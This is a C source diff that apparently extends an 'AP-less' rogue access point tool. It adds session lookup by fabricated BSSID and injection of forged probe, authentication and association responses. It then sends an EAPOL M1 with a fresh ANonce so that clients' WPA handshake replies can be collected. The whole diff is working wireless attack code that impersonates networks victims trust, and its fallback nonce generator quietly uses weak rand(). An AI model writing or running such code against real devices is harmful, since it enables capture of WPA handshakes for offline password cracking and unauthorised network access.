@@ -16,6 +16,7 @@
 
 #include <stdlib.h>
 #include <string.h>
+#include <sys/random.h>   /* getrandom */
 
 #define APLESS_MAX_SESSIONS   64
 #define APLESS_SESSION_TTL    30   /* seconds before an incomplete session is dropped */
@@ -96,25 +97,76 @@ static struct rogue *session_get(struct apless *a, const uint8_t client[6],
 	return freeslot;
 }
 
+/* Find an existing session by its fabricated BSSID + client — how a client's
+ * auth/assoc (addressed to our rogue BSSID) maps back to its session. */
+static struct rogue *session_by_bssid(struct apless *a, const uint8_t bssid[6],
+                                      const uint8_t client[6])
+{
+	for (int i = 0; i < APLESS_MAX_SESSIONS; i++) {
+		struct rogue *r = &a->sessions[i];
+		if (r->in_use &&
+		    memcmp(r->bssid, bssid, 6) == 0 &&
+		    memcmp(r->client, client, 6) == 0)
+			return r;
+	}
+	return NULL;
+}
+
+/* Fill `buf` with random bytes for a fresh ANONCE. */
+static void apless_rand(uint8_t *buf, size_t n)
+{
+	ssize_t got = getrandom(buf, n, 0);
+	if (got != (ssize_t)n) {              /* fallback: never ship a weak/zero nonce */
+		for (size_t i = 0; i < n; i++)
+			buf[i] = (uint8_t)(rand() ^ (i * 131));
+	}
+}
+
 void apless_on_frame(struct apless *a, struct inject *inject,
                      const struct dot11_info *d,
                      const uint8_t *raw, size_t raw_len, int channel)
 {
 	(void)raw; (void)raw_len;
 	if (!a || !inject || !d) return;
+	time_t now = time(NULL);
 
-	if (d->kind == DOT11_FRAME_PROBE_REQ) {
+	switch (d->kind) {
+	case DOT11_FRAME_PROBE_REQ: {
 		/* Directed probes only — ignore wildcard/broadcast (phase 2). */
 		if (!d->has_ssid || d->ssid_len == 0) return;
-		time_t now = time(NULL);
 		struct rogue *r = session_get(a, d->sa, d->ssid, d->ssid_len, now);
 		if (!r) return;
 		if (r->last && now - r->last < APLESS_RESP_COOLDOWN) return;
 		r->last = now;
-		/* Impersonate the ESSID the client is looking for. The auth/assoc +
-		 * M1/M2 steps land in the next increments. */
 		inject_probe_response(inject, r->bssid, r->client,
 		                      r->essid, r->essid_len, channel);
+		break;
+	}
+	case DOT11_FRAME_AUTH: {
+		/* A client authenticating to one of our rogue BSSIDs. */
+		struct rogue *r = session_by_bssid(a, d->bssid, d->sa);
+		if (!r) return;
+		r->last = now;
+		inject_auth_response(inject, r->bssid, r->client);
+		break;
+	}
+	case DOT11_FRAME_ASSOC_REQ: {
+		struct rogue *r = session_by_bssid(a, d->bssid, d->sa);
+		if (!r) return;
+		r->last = now;
+		inject_assoc_response(inject, r->bssid, r->client);
+		/* Complete the illusion: fresh ANONCE + our EAPOL M1. The client's
+		 * M2 is tied back to this ANONCE by the handshake collector
+		 * (increment 4). */
+		apless_rand(r->anonce, sizeof r->anonce);
+		inject_eapol_m1(inject, r->bssid, r->client, r->anonce);
+		r->state = ROGUE_M1_SENT;
+		log_debug("apless: M1 sent to %02x:..:%02x impersonating '%s'",
+		          r->client[0], r->client[5], r->essid);
+		break;
+	}
+	default:
+		break;
 	}
 }
 
